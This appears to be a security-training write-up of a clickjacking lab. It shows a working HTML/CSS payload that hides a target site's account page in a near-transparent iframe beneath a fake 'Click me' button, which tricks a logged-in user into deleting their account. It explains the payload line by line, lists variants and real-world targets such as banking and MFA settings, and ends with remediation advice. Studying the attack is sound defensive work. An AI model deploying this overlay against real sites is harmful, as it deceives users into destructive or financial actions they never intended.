# 🧠 Lab-1 — Delete Account (CSRF-protected button)

---

## 1️⃣ OVERVIEW

This lab demonstrates Clickjacking (UI redressing) where:

> A user is tricked into clicking a hidden “Delete Account” button inside an iframe using a fake clickable overlay.

Even though the button is protected by a CSRF token, clickjacking still works because:

👉 the user performs a REAL click inside their authenticated session

---

## 2️⃣ KEY CONCEPT

Fake UI (Click me) → overlays real website  
Real site (iframe) → executes Delete Account action

---

## 3️⃣ LAB OBJECTIVE

Exploit:

/my-account page

Delete Account button (sensitive action)

CSRF-protected endpoint

👉 Goal: force victim click → delete their account

---

## 4️⃣ WHY CSRF TOKEN DOES NOT HELP HERE

CSRF protects request forgery  
Clickjacking uses real user interaction

So:

CSRF token is valid

request is legitimate

but user is tricked into clicking it

---

## 5️⃣ FINAL WORKING PAYLOAD
```
<style>
iframe {
    position: relative;
    width: 500px;
    height: 700px;
    opacity: 0.0001;
    z-index: 2;
}

div {
    position: absolute;
    top: 300px;
    left: 60px;
    z-index: 1;
    background: red;
    padding: 10px;
    font-size: 18px;
}
</style>

<div>Click me</div>

<iframe src="https://YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
```
---

## 6️⃣ PAYLOAD BREAKDOWN (LINE BY LINE)

---

### 🧩 iframe (real website)
```
iframe {
```
Loads real target website inside attacker page.

---
```
position: relative;
```
Allows positioning inside layout.

---
```
width / height
```
Controls visible area so Delete button is inside view.

---
```
opacity: 0.0001;
```
Makes real site invisible but still clickable.

---
```
z-index: 2;
```
Places iframe above fake UI in stacking order.

---

### 🧩 DIV (fake button)
```
div {
```
Fake clickable element shown to victim.

---
```
position: absolute;
```
Allows precise placement over target button.

---
```
top / left
```
Aligns fake click zone over Delete Account button.

---
```
background: red;
```
Makes button visible and convincing.

---

### 🧩 HTML element
```
<div>Click me</div>
```
This is what victim sees and clicks.

---

### 🧩 iframe source
```
<iframe src=".../my-account"></iframe>
```
Loads authenticated account page containing Delete button.

---

## 7️⃣ LAB WALKTHROUGH (STEP-BY-STEP)

---

### Step 1 — Login

User logs in:

wiener:peter

---

### Step 2 — Target identification

Page contains:

Delete Account button (sensitive action)

---

### Step 3 — Build exploit page

Attacker creates HTML page:

fake “Click me”

hidden iframe with target page

---

### Step 4 — Alignment phase

Adjust:

top

left

opacity (debug mode first)

Until:

Click me overlaps Delete Account button

---

### Step 5 — Deliver exploit

Victim loads page → clicks fake button

---

### Step 6 — Execution

Click → Delete Account request sent inside authenticated session

---

### Step 7 — Lab solved

Account deleted.

---

## 8️⃣ REAL-WORLD SCENARIO

Clickjacking works best on:

---

### 💰 Banking systems

transfer funds

add beneficiary

approve payments

---

### 🔐 Account security

delete account

change email/password

disable MFA

---

### 📦 SaaS platforms

API key regeneration

webhook changes

admin role assignment

---

## 9️⃣ ATTACK VARIATIONS

---

### Variant 1: Fake reward page

“Click to claim prize”
→ deletes account or changes settings

---

### Variant 2: Multi-step clickjacking

Step 1: open settings  
Step 2: confirm deletion

---

### Variant 3: Mobile UI redressing

touch misalignment

gesture-based deception

---

## 0️⃣ WHY THIS ATTACK WORKS

- user is authenticated
- cookies auto-sent to iframe
- CSRF token is already valid
- user performs real click

---

## 1️⃣ REMEDIATION

---

### ❌ X-Frame-Options

DENY / SAMEORIGIN

Prevents iframe embedding.

---

### ❌ CSP frame-ancestors

Controls allowed embedding domains

---

### ❌ UI defenses

confirmation dialogs

re-authentication for sensitive actions

double-click confirmations

---

### ❌ UX protections

avoid single-click destructive actions

add explicit warnings

---

## 2️⃣ KEY SECURITY INSIGHT

Clickjacking does NOT bypass authentication — it abuses user interaction inside an authenticated session.

---

## 🔥 FINAL SUMMARY

- Clickjacking is a UI redressing attack where:

- attacker embeds real site in iframe

- overlays fake clickable element

- user unknowingly clicks real sensitive button

- action executes inside authenticated session
